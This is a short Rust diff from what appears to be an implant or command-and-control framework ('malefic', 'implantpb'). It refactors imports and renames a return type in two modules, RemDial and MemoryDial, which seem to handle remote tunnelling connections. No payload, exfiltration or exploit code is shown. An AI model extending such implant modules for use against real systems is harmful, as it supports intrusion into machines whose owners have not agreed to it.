@@ -1,14 +1,7 @@
-use anyhow::anyhow;
-use async_trait::async_trait;
 use futures::SinkExt;
 use malefic_helper::common::rem;
-use malefic_helper::to_error;
-use malefic_modules::{
-    check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult,
-};
-use malefic_proto::proto::implantpb::spite::Body;
 use malefic_proto::proto::modulepb::{Block, Request, Response};
-use malefic_trait::module_impl;
+use crate::prelude::*;
 
 // #[cfg(feature = "load_rem")]
 // pub struct LoadRem {}
@@ -44,7 +37,7 @@ impl Module for RemDial {}
 #[cfg(feature = "rem_dial")]
 #[async_trait]
 impl ModuleImpl for RemDial {
-    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let request = check_request!(receiver, Body::Request)?;
         let args = check_field!(request.args)?;
         let cmdline = args.join(" ");
@@ -66,7 +59,7 @@ impl Module for MemoryDial {}
 #[cfg(feature = "memory_dial")]
 #[async_trait]
 impl ModuleImpl for MemoryDial {
-    async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, receiver: &mut Input, sender: &mut Output) -> ModuleResult {
         let request = check_request!(receiver, Body::Request)?;
         let Request { args, .. } = request;
         
